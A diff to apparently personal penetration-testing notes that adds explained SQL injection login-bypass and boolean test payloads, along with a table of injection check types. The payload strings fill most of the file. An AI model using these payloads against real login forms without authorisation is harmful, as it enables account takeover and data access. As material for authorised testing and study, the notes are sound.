@@ -9,47 +9,88 @@ cat /usr/share/wordlists/seclists/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzz
 ```
 
 ---
+
+| Category         | What you're checking                                                       |
+| ---------------- | -------------------------------------------------------------------------- |
+| Error-based      | Does malformed SQL cause a database error?                                 |
+| Boolean-based    | Does a true condition produce a different response from a false condition? |
+| Time-based       | Does a conditional database delay affect response time?                    |
+| Input handling   | Are quotes, special characters and SQL syntax handled differently?         |
+| Parameterisation | Is user input treated as data rather than executable SQL?                  |
+
+---
 # 🧠 SQL Injection Payloads (Auth Bypass / Login Bypass)
+
+## Basic Test
+
+```
+test'
+```
+
+```
+test''
+```
 
 ## 🔓 Basic authentication bypass
 
+Closes the username string and adds an always-true condition.
 ```
-' OR 1=1--
-```
-
-```
-' OR '1'='1--
+test' OR 1=1--
 ```
 
+Same technique, using a string comparison.
 ```
-' OR ''=''
+test' OR '1'='1--
+```
+
+Uses an empty-string comparison that is always true.
+```
+test' OR ''=''
 ```
 
 ---
 
 ## 👤 Username-based bypass
 
+Attempts to preserve a username prefix while adding an always-true condition.
 ```
-<username>' OR 1=1--
+username' OR 1=1--
 ```
 
+Attempts to terminate the username string and comment out the remaining SQL query.
+
 ```
-<username>'--
+username'--
 ```
 
 ---
 
 ## 🧪 Common tautology bypass
 
+Attempts a tautology without a username prefix.
 ```
 ' OR '1'='1'--
 ```
 
+Same tautology using different characters.
 ```
 ' OR 'a'='a'--
 ```
 
 ---
+## Boolean Testing
+
+**Test C — True condition**
+
+```
+test' AND '1'='1'-- -
+```
+
+**Test D — False condition**
+
+```
+test' AND '1'='2'-- -
+```
 
 # SQL Injection
 
